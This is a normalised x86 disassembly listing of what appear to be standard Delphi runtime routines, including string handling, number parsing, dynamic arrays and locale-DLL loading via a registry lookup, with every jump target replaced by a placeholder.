lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_3a65a7c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_3a65cd8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_3a653e0
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_3a653e0
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_3a65cd8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_3a65b6c
jmp r-xdata
sub_3a65b6c
test ecx ecx
je sub_3a65a7c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_3a63030
pop edx
push [ edx ]
mov [ edx ] eax
call sub_3a6136c
retn
sub_3a65ba0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_3a65b6c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_3a65c08
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_3a65c8c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_3a65bfc
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_3a65b6c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_3a65cd8
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_3a65a6c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3a65a54
mov ebx eax
mov eax [ edi ]
call sub_3a65bfc
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_3a63154
mov eax esi
sub_3a65d1c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_3a65d4c
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a65d4c
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_3a65d4c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_3a65d1c
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_3a63030
sub_3a65dec
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_3a65e38
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_3a65e38
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_3a652c4
jmp r-xdata
call sub_3a652a0
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_3a65a94
jmp r-xdata
call sub_3a65a7c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_3a65e20
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_3a65e38
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_3a65dec
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_3a66cb4
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_3a665dc
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_3a63030
sub_3a65f48
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_3a63154
mov edx [ eax + esi ]
add eax ebx
call sub_3a652f4
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_3a65ab8
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_3a65f30
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_3a63154
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_3a66064
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_3a65f48
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_3a66ccc
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_3a66618
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_3a63030
sub_3a66064
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_3a652f4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_3a65ab8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_3a65f30
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
mov ecx [ ecx ]
push [ edi + 0x4 ]
call sub_3a66064
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_3a65f48
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_3a66ccc
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_3a66618
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_3a63030
sub_3a6618c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_3a65bfc
mov edx eax
mov ecx esi
mov eax ebx
call sub_3a66180
pop edx
pop esi
pop ebx
retn
sub_3a661b0
push ecx
xor edx edx
mov [ esp ] edx
mov edx eax
test edx edx
je r-xdata
mov ecx esp
xchg ecx eax
xchg ecx edx
call sub_3a65ae0
mov eax [ esp ]
pop edx
retn
sub edx 0x4
mov edx [ edx ]
sub_3a661d8
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_3a661fc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
movzx eax [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
movzx eax [ esi + ebp - 0x1 ]
call sub_3a633f4
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
movzx edi cl
sub edi 0x30
jmp r-xdata
add al 0xf9
sub al 0x6
jb r-xdata
movzx eax [ esi + ebp - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
movzx eax [ esi + ebp ]
call sub_3a633f4
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
movzx edi cl
sub edi 0x37
jmp r-xdata
add al 0xe6
sub al 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
movzx edi [ esi + ebp - 0x1 ]
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
movzx edi cl
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_3a661d8
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
movzx ecx [ esi + ebp - 0x1 ]
mov eax ecx
add al 0xd0
sub al 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_3a66444
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
movzx eax [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_3a6643c
jmp r-xdata
mov al 0x4
call sub_3a63030
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_3a63030
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_3a62f14
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_3a62ee0
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_3a63a44
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_3a65e38
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_3a63154
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_3a63a44
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_3a66424
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_3a66444
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_3a665dc
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_3a62efc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_3a65e38
sub_3a66618
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_3a665dc
pop edx
pop eax
sub_3a66640
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_3a61354
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_3a66670
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_3a612dc
mov eax esp
mov dl 0x1
call sub_3a668d4
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_3a666b8
push ebx
push esi
push edi
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
mov edi esi
cmp esi [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_3a66670
mov edi eax
jmp r-xdata
cmp esi [ ebx + 0x8 ]
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp esi [ ebx + 0xc ]
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_3a666f0
push ebx
push esi
mov esi eax
jmp r-xdata
movzx ebx [ esi ]
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp bl 0x5c
jne r-xdata
push esi
call sub_3a61274
mov esi eax
sub_3a66710
push ebp
mov ebp esp
add esp 0xfffffdac
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_3a612e4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call sub_3a612ec
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x253 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_3a666f0
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x253 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_3a666f0
mov edi eax
mov eax edi
sub eax esi
add eax ebx
inc eax
cmp eax 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x253 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_3a666f0
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax edi
sub eax esi
inc eax
push eax
push esi
lea eax [ ebp - 0x253 ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14e ]
push eax
lea eax [ ebp - 0x253 ]
push eax
call sub_3a612ac
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
call sub_3a612a4
lea eax [ ebp - 0x122 ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x253 ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x253 ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x122 ]
push eax
lea eax [ ebp - 0x253 ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x122 ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_3a668d4
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_3a612dc
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_3a61334
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_3a669d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_3a66710
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_3a6133c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_3a61334
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_3a6132c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_3a6133c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_3a61334
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_3a612fc
push eax
call sub_3a612d4
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_3a66b74
push ebx
push esi
push edi
push ebp
mov ebp eax
mov edi [ rw-data ]
test edi edi
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ ebx ]
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax edi
call sub_3a62efc
jmp r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebp
jne r-xdata
mov edi esi
mov eax [ esi ]
mov [ ebx ] eax
mov edx 0x8
mov eax edi
call sub_3a62efc
jmp r-xdata
sub_3a66bd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_3a66c13
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_3a66c44
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_3a66ca8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3a66bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a66caf
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
